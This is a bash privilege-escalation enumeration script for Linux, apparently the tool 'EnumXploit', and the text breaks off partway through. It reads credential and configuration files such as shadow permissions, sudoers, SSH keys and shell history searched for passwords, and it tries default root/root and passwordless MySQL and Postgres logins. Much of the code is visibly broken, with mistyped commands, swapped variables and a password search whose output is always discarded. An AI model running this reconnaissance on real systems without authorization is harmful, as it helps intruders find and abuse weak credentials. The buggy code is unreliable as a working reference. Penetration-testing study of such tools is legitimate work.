#!/bin/bash



###############################################################
# System Enumeration And Exploitation  Script v1.0            #
#                                                             #
# This script is for penetration testing purposes only.       #
#                                                             #
# Author: Michaelking                                         #
# Author: Jay                                                 #
# Version: 1.0                                                #
#                                                             #
###############################################################


bold=$(tput bold)
normal=$(tput sgr0)
WIDTH=$(tput cols)

red=$(tput setaf 1)
green=$(tput setaf 2)
orange=$(tput setaf 3)
blue=$(tput setaf 4)
white=$(tput setaf 7)
violet=$(tput setaf 91)



script_name="EnumXploit"
version="1.0"
author=("${violet}Osunde Goodluck Michael${normal}" "${violet}Jay Chavan${normal}")








echo "${red}${bold}      ______                      __   __      _       _ _         ${normal}"
echo "${red}${bold}     |  ____|                     \ \ / /     | |     (_) |        ${normal}"
echo "${red}${bold}     | |__   _ __  _   _ _ __ ___  \ V / _ __ | | ___  _| |_       ${normal}"
echo "${red}${bold}     |  __| | '_ \| | | | '_  '_ \| > < | |   | |/ _ \| | __|      ${normal}"
echo "${white}${bold}     | |____| | | | |_| | | | | | |/ . \| |_) | | (_) | | |_       ${normal}"
echo "${white}${bold}     |______|_| |_|\__,_|_| |_| |_/_/ \_\ .__/|_|\___/|_|\__|      ${normal}"
echo "${white}${bold}                                        | |                        ${normal}"
echo "${white}${bold}                                        |_|                        ${normal}"



echo "${bold}Script:${normal} $script_name"
echo "${bold}Version:${normal} $version"
echo "${bold}Author:${normal} ${author[0]}"
echo "${bold}Author:${normal} ${author[1]}"
echo ""
echo "${bold}${red}DISCLAIMER:${normal} This script is intended for penetration testing purposes only. Use at your own risk and only with explicit permission from the target systems' owners. The author(s) of this script are not responsible for any damages caused by the misuse of this tool.${normal}"
echo ""


function Enumeration(){
    function system_information(){
        echo  "${green}####################################################################################${normal}" 
        echo  "${blue}############################   SYSTEM INFORMATION   ################################${normal}"
        echo  "${green}####################################################################################${normal}"  
        hostnameInfo=$(hostname 2>/dev/null)
        if [ "$hostnameInfo" ]
        then 
            printf "${orange}=====================#[+]    Hostname information    [+]#===========================${normal}\n%s\n" "${green}$hostnameInfo${normal}" 
        else
            echo "${red}No Hostname information found${normal}"
        fi
        echo -e "\n"
        kernel_version_info=$(uname -a 2>/dev/null)
        if [ "$kernel_version_info" ]
        then
            printf "${orange}=====================#[+]    Kernel information      [+]#===========================${normal}\n%s\n" "${green}$kernel_version_info${normal}"
        else
            echo "${red}No Kernel information found${normal}"
        fi
        echo -e "\n"
        kernel_release_number=$(uname -r 2>/dev/null)
        if [ "$kernel_release_number" ]
        then
            printf "${orange}=====================#[+]    Kernel release number   [+]#===========================${normal}\n%s\n" "${green}$kernel_release_number${normal}"
        else
            echo "${red}No Kernel Release information found${normal}"
        fi
        echo -e "\n"
        system_dist_and_version=$(cat /etc/issue 2>/dev/null)
        if [ "$system_dist_and_version" ]
        then 
            printf "${orange}=======================#[+]    System distrubution/version info    [+]#===========================${normal}\n%s\n" "${green}$system_dist_and_version${normal}"
        else 
            echo "${red}No Distribution version found${normal}"
        fi
        echo -e "\n"
        system_distribution_info=$(cat /etc/*release* 2>/dev/null)
        if [ "$system_distribution_info" ]
        then
            printf "${orange}=======================#[+]    System Distribution information    [+]#===========================${normal}\n%s\n" "${green}$system_distribution_info${normal}"
        else
            echo "${red}No System Distribution information found${normal}"
        fi
        echo -e "\n"
        current_loaded_kernel_modules=$(lsmod 2>/dev/null)
        if [ "$current_loaded_kernel_modules" ]
        then
            printf "${orange}=======================#[+]    Kernel Modules   [+]#===========================${normal}\n%s\n" "${green}$current_loaded_kernel_modules${normal}"
        else
            echo "${red}No Kernel modules found${normal}"
        fi
        echo -e "\n"
        system_hardware_info=$(dmidecode 2>/dev/null)
        if [ "$system_hardware_info" ]
        then 
            printf "${orange}=======================#[+]    system hardware information    [+]#}===========================${normal}\n%s\n" "${green}$system_hardware_info${normal}" 
        else
            echo "${red}No Hardware information found${normal}"
        fi
        echo -e "\n"
    }
    function user_information(){
        echo  "${green}####################################################################################${normal}" 
        echo  "${blue}###########################   USER/GROUPS INFORMATION   ############################${normal}"
        echo  "${green}####################################################################################${normal}"  
        user_full_name=$(finger | grep "$(whoami)" | awk '{print $3, $2, $1}' 2>/dev/null)
        if [ "$user_full_name" ]
        then 
            printf "${orange}=======================#[+]    Users full name [+]#===========================${normal} \n%s\n" "${green}$user_full_name${normal}"
        else
            echo "${red}No full name for Current User${normal}"
        fi
        echo -e "\n"
        currentUserName=$(whoami 2>/dev/null)
        if [ "$currentUserName" ]
        then
            printf "${orange}=======================#[+]    Current User name   [+]#===========================${normal} \n%s\n" "${green}$currentUserName${normal}"
        else 
            echo "${red}No Current User name found${normal}"
        fi
        echo -e "\n"
        currentUserId=$(id 2>/dev/null)
        if [ "$currentUserId" ]
        then
            printf "${orange}=======================#[+]    Current user/group IDs  [+]#===========================${normal} \n%s\n" "${green}$currentUserId${normal}"
        else 
            echo "$red}No User/Group found ${normal}"
        fi
        echo -e "\n"
        all_users_account=$(getent passwd 2>/dev/null)
        if [ "$all_users_account" ]
        then
            printf "${orange}=======================#[+]    All users account(s)    [+]#===========================${normal} \n%s\n" "${green}$all_users_account${normal}"
        else
            echo "${red}No User(s) Account found${normal}"
        fi 
        echo -e "\n"
        admin_account=$(grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null)
        if [ "$admin_account" ]
        then
            printf "${orange}=======================#[+]   Privileged user account(s)  [+]#===========================${normal} \n%s\n" "${green}$admin_account${normal}"
        else
            echo "${red}No User with Privileged Access${normal}" 
        fi
        echo -e "\n"
        current_user_group=$(groups 2>/dev/null)
        if [ "$current_user_group" ]
        then
            printf "${orange}=======================#[+]    Current user groups     [+]#===========================${normal} \n%s\n" "${green}$current_user_group${normal}"
        else 
            echo "${red}No Current User Group/s found${normal}"
        fi
        echo -e "\n"
        all_users_group=$(getent group 2>/dev/null)
        if [ "$all_users_group" ]
        then    
            printf "${orange}=======================#[+]    All users group(s)   [+]#===========================${normal} \n%s\n" "${green}$all_users_group${normal}"
        else
            echo "${red}No User(s) Group found${normal}" 
        fi
        echo -e "\n"
        current_logged_on_users=$(w 2>/dev/null)
        if [ "$current_logged_on_users" ]
        then 
            printf "${orange}=======================#[+]    Current logged on user(s)   [+]#===========================${normal} \n%s\n" "${green}$current_logged_on_users${normal}"
        else
            echo "${red}No Current Logged on Users found${normal}"
        fi
        echo -e "\n"
        last_logged_on_users=$(last 2>/dev/null)
        if [ "$last_logged_on_users" ]
        then 
            printf "${orange}=======================#[+]    Last logged on user(s)  [+]#===========================${normal} \n%s\n" "${green}$last_logged_on_users${normal}"
        else
            echo "${red}No Last Logged on Users found${normal}"
        fi
        echo -e "\n"
    }
    function general_information(){
   
        shadow_read=$(ls -la /etc/shadow)
        read_shadow_perm=$(echo "$shadow_read" | awk '{print $1}' 2>/dev/null) 
        if [ "$read_shadow_perm" == "-rw-r--r--" ] || [ "$read_shadow_perm" == "--w----r--" ] || [ "$read_shadow_perm" == "-rw-r--rw-" ] || [ "$read_shadow_perm" == "-rw-rw-rw-" ]
        then
            printf "${orange}=======================#[+]    Read Shadow    [+]#===========================${normal} \n%s\n" "${green}$shadow_read${normal}"
        else
            echo  "${red}Shadow files not readable${normal}"
        fi
        echo -e "\n"
        shadow_write=$(ls -la /etc/shadow)
        write_shadow_perm=$(echo "$shadow_write" | awk '{print $1}' 2>/dev/null) 
        if [ "$write_shadow_perm" == "-rw-r--rw-" ] || [ "$write_shadow_perm" == "-rw-----w-" ] || [ "$write_shadow_perm" == "-rw-rw-rw-" ]
        then
            printf "${orange}=======================#[+]    Writeable Shadow    [+]#===========================${normal} \n%s\s" "${green}$shadow_write${normal}"
        else
            echo "${red}Shadow files not writeable${normal}"
        fi   
        echo -e "\n"
        passwd_write=$(ls -la /etc/passwd)
        write_passwd_perm=$(echo "$passwd_write" | awk '{print $1}' 2>/dev/null)
        if [ "$write_passwd_perm" == "-rw-r--rw-" ] || [ "$write_passwd_perm" == "-rw-----w-" ] || [ "$write_passwd_perm" == "-rw-rw-rw-" ]
        then 
            printf "${orange}=======================#[+]    Writeable Password   [+]#===========================${normal} \n%s\n" "${green}$passwd_write${normal}"
        else
            echo  "${red}Password files not writeable${normal}"
        fi   
        echo -e "\n"
        sudoers_write=$(ls -la /etc/sudoers)
        write_sudoers_perm=$(echo "$sudoers_write" | awk '{print $1}' 2>/dev/null)
        if [ "$write_sudoers_perm" == "-rw-r--rw-" ] || [ "$write_sudoers_perm" == "-rw-----w-" ] || [ "$write_sudoers_perm" == "-rw-rw-rw-" ]
        then 
            printf "${orange}=======================#[+]    Writeable Sudoers    [+]#===========================${normal} \n%s\n" "${green}$sudoers_write${normal}"
        else
            echo "${red}Sudoers files not writeable[${normal}"
        fi
        echo -e "\n"
        sudoperms=$(echo '' | sudo -S -l -k 2>/dev/null)
        if [ "$sudoperms" ]
        then
            printf "${orange}===========================#[+]    Sudo Without Password  [+]#===========================${normal} \n%s\n" "${green}$sudoperms${normal}"
            binary=$(sudo -S -l | grep  "NOPASSWD" 2>/dev/null)
            if [ "$binary" ]
            then
                printf "${orange}===========================#[+]    Binaries    [+]#===========================${normal} \n%s\n" "${green}$binary${normal}"
            else
                echo  "${red}No binaries found${normal}"
            fi
        else
            echo "${red}We can't sudo with password${normal}"
        fi
        echo -e "\n"
        hashes_in_passwd=$(grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null)
        if [ "$hashes_in_passwd" ]
        then
            printf "${orange}===========================#[+]Checking hash in password file[+]#===========================${normal} \n%s\n" "${green}$hashes_in_passwd${normal}" 
        else
            echo "${red}No Hash found in Password file${normal}"
        fi
        echo -e "\n"
        sudo_env=$(sudo -S -l | grep "env_keep" 2>/dev/null) 
        if [ "$sudo_env" ]
        then
            printf "${orange}===========================#[+]Checking sudo environment variables[+]#===========================${normal} \n%s\n" "${green}$sudo_env${normal}"
        else 
            echo "${red}No Environment Variables${normal}"
        fi
        echo -e "\n"
        command_history=$(ls -la ~/.bash_history 2>/dev/null)
        if [ "$command_history" ]
        then
            printf "${orange}=======================#[+]    Bash Histoy  [+]#==========================={normal} \n%s\n" "${green}$command_history${normal}"
        else 
            echo "${red}No Bash history found${normal}"
        fi
        echo -e "\n"
        searching_password=$(cat ~/.*history |  grep "p" >/dev/null)
        if [ "$searching_password" ]
        then 
            printf "${orange}=======================#[+]    Searching in Bash History    [+]#===========================${normal} \n%s\n" "${green}${searching_password}${normal}"
        else 
            echo "${red}No Password in history file${normal}"
        fi
        echo -e "\n"
        common_files=$( which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null )
        if [ "$common_files" ]
        then 
            printf "${orange}=========================#[+]  Common Intersting Files [+]#===========================${normal} \n%s\n" "${green}$common_files${normal}" 
        else
            echo "${red}No Interesting files found${normal}"
        fi
        compillers=$(dpkg --list 2>/dev/null | grep compiler | grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null)
        if [ "$compillers" ]
        then 
            printf "${orange}=========================#[+]  Compillers  [+]#===========================${normal}\n%s\n" "${green}$compillers${normal}"
        else
            echo "${red}No Compilers found${normal}"
        fi  
    }
    function interesting_files(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}############################   INTERESTING FILES   #################################${normal}"
        echo  "${green}####################################################################################${green}"  
        sensitive_files=$(ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null) 
        if [ "$sensitive_files" ]
        then
            printf "${orange}=======================#[+]    Listing Sensitive files    [+]#===========================${normal} \n%s\n" "${green}$sensitive_files${normal}"
        else 
            echo "${red}Can't list files${normal}"
        fi
        echo -e "\n"
        allsuid=$(find / -perm -4000 -type f 2>/dev/null)
        findsuid=$(find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$findsuid" ]
        then
            printf "${orange}=======================#[+]    SUID Files    [+]#===========================${normal} \n%s\n" "${green}$findsuid${normal}"
        else 
            echo "${red}No suid files found${normal}"
        fi
        echo -e "\n"
        wwsuid=$(find $allsuid -perm -4002 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$wwsuid" ]
        then
            printf "${orange}=======================#[+]    World-writable SUID files    [+]#===========================${normal} \n%s\n" "${green}${normal}"
        else
            echo "${red}No world writeble suid files${normal}"
        fi
        echo -e "\n"
        wws_uidrt=$(find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$wws_uidrt" ]
        then
            printf "${orange}=======================#[+]    World-writable SUID files Own by root    [+]#===========================${normal} \n%s\n" "${green}$wws_uidrt${normal}" 
        
        else
            echo "${red}No world writeable Suid files for Root${normal}"
        fi    
        echo -e "\n"
        all_sgid=$(ind / -perm -2000 c -type f 2>/dev/null)
        find_sgid=$(find $all_sgid -perm -2000 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$find_sgid" ]
        then
            printf "${orange}=======================#[+]   SGID Files    [+]#===========================${normal} \n%s\n" "${green}$find_sgid${normal}" 
        else
            echo "${red}No sgid files found${normal}"
        fi
        echo -e "\n"
        wwsgid=$(find $all_sgid -perm -2002 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$wwsgid" ]; then
            printf "${orange}=======================#[+]   World-writable SGID files    :+]#===========================${normal} \n%s\n" "${green}$wwsgid${normal}" 
        else
            echo "${red} No writeable sgid files${normal}"
        fi
        echo -e "\n"
        check_suid_env=$(ls /usr/local/bin | grep -qE "suid|suid_env|sudo_env2|suid_so 2>/dev/null" )
        if [ "$check_suid_env" ]
        then
            printf "${orange}=======================#[+]   SUID ENV VARIABLE  [+]#===========================${normal} \n%s\n" 
            
            if [ "$check_suid_env" == "suid_env" ]
            then
                ls /usr/local/bin/suid_env
            elif [ "$check_suid_env" == "suid_env2" ]
            then
                ls /usr/local/bin/suid_env2
            elif [ "$check_suid_env" == "suid_so" ]
            then
                ls /usr/local/bin/suid_so
            else
                echo "${red}No suid env variable found ${normal}"
            fi
        else
            echo "${red} No suid env file found${normal}"
        fi
            
        wwsgidrt=$(find $all_sgid -uid 0 -perm -2002 -type f -exec ls -la {} \; 2>/dev/null )
        if [ "$wwsgidrt" ]
        then
            printf "${orange}=======================#[+]    World-writable SGID files Own by root    [+]#===========================${normal} \n%s\n" "${green}$wwsgidrt${normal}" 
        else
            echo "${red}No world writeable sgid files for root${normal}"
        fi
        echo -e "\n"

        allconf=$(find /etc/ -maxdepth 1 -name '*.conf' -type f -exec ls -la {} \; 2>/dev/null)
        if [ "$allconf" ]
        then
            printf "${orange}=======================#[+]    All *.conf files in /etc    [+]#===========================${normal} \n%s\n" "${green}$allconf${normal}"
        else
            echo "${red}No .config files in /etc directory${normal}"
        fi
        echo -e "\n"
        bakfiles=$(find / -name '*.bak' -type f 2>/dev/null | grep ".bak")
        if [ "$bakfiles" ]
        then
            printf "${orange}=======================#[+]    Location and Permissions (if accessible) of .bak file(s)    [+]#===========================${normal} \n%s" "${green}$bakfiles${normal}"
        else
            echo "${red}No .bak files${normal}"
        fi  
        echo -e "\n"  
    }
    function software_configs(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}############################   SOFTWARE CONFIGs   ##################################${normal}"
        echo  "${green}####################################################################################${green}"  
        sudo_ver=$(sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null)
        if [ "$sudo_ver" ]
        then
            printf "${orange}=======================#[+]   Sudo Version    [+]#===========================${normal} \n%s\n" "${green}$sudo_ver${normal}"
        else
            echo "${red}No sudo version found${normal}"
        fi
        echo -e "\n"
        mysqlver=$(mysql --version 2>/dev/null)
        if [ "$mysqlver" ]
        then
            printf "${orange}=======================#[+]    Mysql Version    [+]#===========================${normal} \n%s\n" "${green}$mysqlver"${normal}
        else
            echo "${red}MYSQL not found${normal}"
        fi
        echo -e "\n"
        mysqlconnect=$(mysqladmin -uroot -proot version 2>/dev/null)
        if [ "$mysqlconnect" ]; then
            printf "${orange}=======================#[+]   Mysql loggin with uroot proot allowed    [+]#===========================${normal} \n%s\n" "${green}$mysqlconnect${normal}"
        else
            echo "${red}MYSQL login with userroot and passwordroot not permitted${normal}"
        fi
        echo -e "\n"
        mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
        if [ "$mysqlconnectnopass" ]; then
            printf "${orange}=======================#[+]   mysql with uroot and no password allowed    [+]#===========================${normal} \n%s\n" "${green}$mysqlconnectnopass${normal}"
        else 
            echo "${red}MYSQL login with userroot and no password not permitted${normal}"
        fi 
        echo -e "\n"
        psql_ver=$(psql -V 2>/dev/null)
        if [ "$mysqlver" ]
        then
            printf "${orange}=======================#[+]    Postgres Version    [+]#===========================${normal} \n%s\n" "${green}$psql_ver"${normal}
        else
            echo "${red}POSTGRES not found${normal}"
        fi
        echo -e "\n"
        postgres_connect=$(psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version)
        if [ "$postgres_connect" ] 
        then 
            printf "${orange}=======================#[+]   potgres db connection with user postfres and no password allowed     [+]#===========================${normal} \n%s\n" "${green}$postgres_connect${normal}" 
        else
            echo "${red}POSTGRES db connection with user postfres and no password allowed${normal}"
        fi
        echo -e "\n"
        postgres_connect_psql=$(psql -U pgsql -w template0 -c 'select version()' 2>/dev/null | grep version)
        if [ "$postgres_connect_psql" ]
        then
           printf "${orange}=======================#[+]   potgres db connection with user psql and no password allowed     [+]#===========================${normal} \n%s\n" "${green}$postgres_connect_psql${normal}" 
        else
            echo "${red}POSTGRES db connection with user postfres and no password allowed${normal}"
        fi
        echo -e "\n"
        apache_ver=$(apache2 -v 2>/dev/null; httpd -v 2>/dev/null)
        if [ "$apache_ver" ]
        then
            printf "${orange}=======================#[+]    Apache Version    [+]#===========================${normal} \n%s\n" "${green}$apache_ver${normal}" 
        else
            echo "${red}Apache not found${normal}"
        fi
        echo -e "\n"
        apache_user=$(grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null)
        if [ "$apache_user" ]
        then
           printf "${orange}=======================#[+]    Apache User    [+]#===========================${normal} \n%s\n" "${green}$apache_user${normal}" 
        else
            echo "${red}Apache user not found${normal}"
        fi
        echo -e "\n"
        apache_modules=$(apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null)
        if [ "$apache_modules" ]
        then
            printf "${orange}=======================#[+]    Apache Modules    [+]#===========================${normal} \n%s\n" "${green}$apache_modules${normal}"
        else
            echo "${red}No installed apache modules${normal}"
        fi   
        echo -e "\n"
    }
    function environment_information(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}############################   Environmental INFORMATION   #########################${normal}"
        echo  "${green}####################################################################################${green}" 
        env_info=$(env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null)
        if [ "$env_info" ]
        then
            printf "${orange}=======================#[+]    Environments Information    [+]#===========================${normal} \n%s\n" "${green}$env_info${normal}"
        else
            echo "${red}No environment information found${normal}"
        fi
        echo -e "\n"
        sestatus=$(sestatus 2>/dev/null)
        if [ "$sestatus" ]
        then
            printf "${orange}=======================#[+]    System Enhance Linux    [+]#===========================${normal} \n%s\n" "${green}$sestatus${normal}"
        else
            echo -e "${red}System enhance linux disabled${normal}"
        fi
        echo -e "\n"
        pathinfo=$(echo $PATH 2>/dev/null)
        if [ "$pathinfo" ]
        then
            pathswriteable=$(ls -ld $(echo $PATH | tr ":" " ") 2>/dev/null)
            printf "${orange}=======================#[+]    Path  Information   [+]#===========================${normal} \n%s\n" "${green}$pathswriteable${normal}"
        else
            echo "${red}No Path found${normal}"            
        fi
        echo -e "\n"
        shellinfo=$(cat /etc/shells 2>/dev/null)
        if [ "$shellinfo" ]
        then
            printf "${orange}=======================#[+]    System Enhance Linux    [+]#===========================${normal} \n%s\n" "${green}$shellinfo${normal}"
        else
            echo "${red}No available shells${normal}"
        fi
        echo -e "\n"
    }
    function storage_and_cpu_infomation(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}################################   STORAGE/CPU INFORMATION   #######################${normal}"
        echo  "${green}####################################################################################${green}"  
        mounted_device_info=$(cat /proc/mounts 2>/dev/null)
        if [ "$mounted_device_info" ]
        then
            printf "${orange}=======================#[+]    Root Squash   [+]#===========================${normal}  \n%s\n" "${green}$root_squash${normal}"
        else
            echo -e "${red}No mount file system information found${normal}"
        fi 
        echo -e "\n" 
        dir=$(ls -la /etc/exports 2>/dev/null)
        if [ "$dir" ]
        then
            root_squash=$(cat $dir | grep "no_root_squash" 2>/dev/null)
            if [ "$root_squash" ]
            then
                printf "${orange}=======================#[+]    Root Squash    [+]#===========================${normal}  \n%s\n" "${green}$mounted_device_info${normal}"
            else
                echo -e "${red} No Root Squash found ${normal}"
            fi
        else
            echo "${red} No exports found ${normal}"
        fi 

        echo -e "\n"
        cpu_info=$(cat /proc/cpuinfo 2>/dev/null)
        if [ "$cpu_info" ]
        then
            printf "${orange}=======================#[+]    CPU informations    [+]#===========================${normal}    \n%s\n" "${green}$cpu_info${normal}"
        else
            echo -e "${red}No CPU information found ${normal}"
        fi
        echo -e "\n" 
        usb_device_info=$(lsusb 2>/dev/null)
        if [ "$usb_device_info" ]
        then
            printf "${orange}=======================#[+]    Checking for connected USB devices  [+]#===========================${normal} \n%s\n" "${green}$usb_device_info${normal}"
        else 
            echo -e "${red}No connected USB devices found${normal}"
        fi
        echo -e "\n" 
        block_device_info=$(lsblk 2>/dev/null) 
        if [ "$block_device_info" ]
        then
            printf "${orange}=========================#[+]  Checking Block devices  [+]#===========================${normal} \n%s\n" "${green}$block_device_info${normal}"
        else 
            echo -e "${red}No block devices found${normal}"
        fi
        echo -e "\n" 
        free_memory_info=$(free -m 2>/dev/null)
        if [ "$free_memory_info" ]
        then
            printf "${orange}=======================#[+}    Free and Used Memory    [+]#==========================={normal}  \n%s\n" "${green}$free_memory_info${normal}"
        else 
            echo -e "${red}No memory information found${normal} "
        fi
        echo -e "\n" 
        system_memory_info=$(cat /proc/meminfo 2>/dev/null)
        if [ "$system_memory_info" ]
        then
            printf "${orange}========================#[+]   Memory Usage    [+]#===========================${normal} \n%s\n" "${green}$system_memory_info${normal}"
        else 
            echo -e "${red}No memory Information found${normal}"
        fi
        echo -e "\n" 
        disk_usage_info=$(df -h 2>/dev/null)
        if [ "$disk_usage_info" ]
        then
            printf "${orange}=========================#[+]   Mounted filesystem disk usage   [+]#===========================${normal}  \n%s\n" "${green}$disk_usage_info${normal}"
        else 
            echo -e "${red}No mounted filesystem information found${normal}"
        fi
        echo -e "\n" 
        up_time_info=$(uptime 2>/dev/null):
        if [ "$up_time_info" ]
        then
            printf "${orange}=========================#[+]  System Uptime info  [+]#===========================${normal} \n%s\n" "${green}$up_time_info${normal}" 
        else
            echo  "${red}No System Uptime information found${normal}"
        fi       
        echo -e "\n"  
    }
    function service_information(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}############################   STORAGE/CPU INFORMATION   ###########################${normal}"
        echo  "${green}####################################################################################${green}"  
        systemctl_info=$(systemctl list-units --type service --no-pager 2>/dev/null)
        if [ "$systemctl_info" ]
        then
            printf "${orange}=========================#[+]    Active Systemd Service    [+]#===========================${normal} \n%s\n" "${green}$systemctl_info${normal}"
        else
            echo  "${red}No running system services${normal}"
        fi
        echo -e "\n" 
        sys_service_info=$(service --status-all 2>/dev/null)
        if [ "$sys_service_info" ]
        then
            printf "${orange}=========================#[+]   System Services    [+}#===========================${normal}\n%s\n" "${green}$sys_service_info${normal}"
        else
            echo  "${red}No system services found${normal}"
        fi
        echo -e "\n" 
    }
    function network_information(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}####################################   NETWORK INFORMATION   #######################${normal}"
        echo  "${green}####################################################################################${normal}"  
        network_interface_info=$(ifconfig 2>/dev/null)
        if [ "$network_interface_info" ]
        then
            printf "${green}=======================#[+]     Network Interface and IPs   [+]#===========================${normal} \n%s\n" "${green}$network_interface_info${normal}"
        else
            echo "${red}No network interface found${normal}"
        fi
        echo -e "\n" 
        kernel_routing_info=$(route -n 2>/dev/null)
        if [ "$kernel_routing_info" ]
        then
            printf "${orange}=======================#[+]    Routing Tables    [+]#===========================${normal} \n%s\n" "${green}$kernel_routing_info${normal}"
        else
            echo "${red}No routing tables${normal}"
        fi
        echo -e "\n" 
        network_interface_config=$(ip addr 2>/dev/null)
        if [ "$network_interface_config" ]
        then
            printf "${orange}=======================#[+]    Ip Address/Network Interfaces   [+]#===========================${normal} \n%s\n" "${green}$network_interface_config${normal}"
        else
            echo "${red}No Ip addresses found${normal}"
        fi
        echo -e "\n" 
        listening_tcp_connect_info=$(netstat -atn | grep ESTABLISHED 2>/dev/null)
        if [ "$listening_tcp_connect_info" ]
        then
            printf "${orange}=======================#[+]    Listening TCP connections    [+]#===========================${normal} \n%s\n" "${green}$listening_tcp_connect_info${normal}"
        else 
            echo "${red}No listening TCP connection${normal}"
        fi
        echo -e "\n" 
        listening_udp_conection_info=$(netstat -utn | grep ESTABLISHED 2>/dev/null)
        if [ "$listening_udp_conection_info" ]
        then 
            printf "${orange}=======================#[+]    Listening UDP connections    [+]#===========================${normal} \n%s\n" "${green}$listening_udp_conection_info${normal}"
        else
            echo "${red}No listening UDP connection${normal}"
        fi
        echo -e "\n" 
        arp_cache_info=$(arp -a 2>/dev/null):
        if [ "$arp_cache_info" ]
        then
            printf "${green}=======================#[+]    ARP Cache    [+]#===========================${normal} \n%s\n" "${green}$arp_cache_info${normal}"
        else 
            echo "${red}No ARP Cache${normal}"
        fi
        echo -e "\n" 
        tcpudp_socket_info=$(ss -tulwn 2>/dev/null)
        if [ "$tcpudp_socket_info" ]
        then
            printf "${green}=======================#[+]   TcpUdp Socket      [+]#===========================${normal} \n%s\n" "${green}$tcpudp_socket_info${normal}"
        else
            echo "${red}No tcpudp Socket infomtions${normal}"
        fi
        echo -e "\n" 
    }
    function process_information(){
        echo  "${green}####################################################################################${normal}" 
        echo  "${blue}################################   PROCESS INFORMATION   ###########################${normal}"
        echo  "${green}####################################################################################${normal}"  
        running_process_info=$(ps 2>/dev/null)
        if [ "$running_process_info" ]
        then
            printf "${orange}=======================#[+]    Running Processes    [+]#===========================${normal} \n%s\n" "${green}$running_process_info${normal}"
        else 
            echo "${red}No running process${normal}"
        fi
        echo -e "\n" 
        process_tree_info=$(pstree 2>/dev/null)
        if [ "$process_tree_info" ]
        then
            printf "${orange}=======================#[+]    Process Tree    [+]#===========================${normal} \n%s\n" "${green}$process_tree_info${normal}"
        else
            echo "${red}No process tree${normal}"
        fi
        echo -e "\n" 
        root_process_info=$(ps -aux | pgrep root 2>/dev/null)
        if [ "$root_process_info" ]
        then
            printf "${orange}=======================#[+]   Root Own Process     [+]#===========================${normal} \n%s\n" "${green}$root_process_info${normal}"
        else
            echo "${red}No root own proccesses${normal}"
        fi
        echo -e "\n" 
    }
    function ssh_information(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}############################   SSH  INFORMATION   ##################################${normal}"
        echo  "${green}####################################################################################${green}"  
        check_ssh_authorizedkey=$(cat ~/.ssh/authorized_keys 2>/dev/null)
        if [ "$check_ssh_authorizedkey" ]
        then
            printf "${orange}=======================#[+]    SSH Authorizationkey    [+]#===========================${normal} \n%s\n" "${green}$check_ssh_authorizedkey${normal}"
        else
            echo "${red}No ssh keys${normal}"
        fi
        echo -e "\n" 
        checking_ssh_daemon_config=$(cat /etc/ssh/sshd_config 2>/dev/null)
        if [ "$checking_ssh_daemon_config" ]
        then
            printf "${orange}=======================#[+]    SSH Configuration    [+]#===========================${normal} \n%s\n" "${green}$checking_ssh_daemon_config${normal}"
            echo -e "\n"
            sshrootlogin=$(grep "PermitRootLogin " /etc/ssh/sshd_config  | grep -v "#" | awk '{print  $2}' 2>/dev/null)
            if [ "$sshrootlogin" = "yes" ]
            then
                printf "${orange}=======================#[+]   Permit Root Login     [+]#===========================${normal} \n%s\n" "${green}$sshrootlogin${normal}" 
            else
                echo "${red}Root login not permitted${normal}"
            fi
        else
            echo "${red}No sshd configuration${normal}"
        fi
        echo -e "\n" 
        ssh_config_file=$(ls -la /etc/ssh/sshd_config 2>/dev/null)
        if [ "$ssh_config_file" ]
        then
            perm=$(echo "$ssh_config_file" | awk '{print $1}' 2>/dev/null)
            if [ "$perm" == "-rw-r--rw-" ] || [ "$perm" == "-rw-----w-" ] || [ "$perm" == "-rw-rw-rw-" ]
            then
                printf "${orange}=======================#[+]   Writeable SSH configuration     [+]#===========================${normal} \n%s\n" "${green}$ssh_config_file${normal}"
            else
                echo "${red}ssh configuration not writeable${normal}"
            fi
        fi
        echo -e "\n" 
        searching_password=$(cat ~/.*history |  grep "p" >/dev/null)
        if [ "$searching_password" ]
        then 
            printf "${orange}=======================#[+]    Searching Password in Bash History    [+]#===========================${normal} \n%s\n" "${green}${searching_password}${normal}"
        else 
            echo "${red}No password in history file${normal}"
        fi
        echo -e "\n" 
        check_ssh_folder=$(ls -la / | pgrep ".ssh" 2>/dev/null)
        if [ "$check_ssh_folder" ]
        then 
            printf "${orange}=======================#[+]   SSH Directory     [+]#===========================${normal} \n%s\n" "${green}$check_ssh_folder${normal}"
        else
            echo "${red}No ssh directory"
        fi
        echo -e "\n" 
    }
    function cron_jobs_information(){
        echo  "${green}####################################################################################${green}" 
        echo  "${blue}########################  CRON/SCHEDULED TASK INFORMATION  #########################${normal}"
        echo  "${green}####################################################################################${green}"  
        all_users_cronjobs=$(ls -l /etc/cron* 2>/dev/null)
        if [ "$all_users_cronjobs" ]
        then 
            printf "${orange}=======================#[+]    Users Cron Jobs    [+]#===========================${normal} \n%s\n" "${green}$all_users_cronjobs${normal}" 
        else
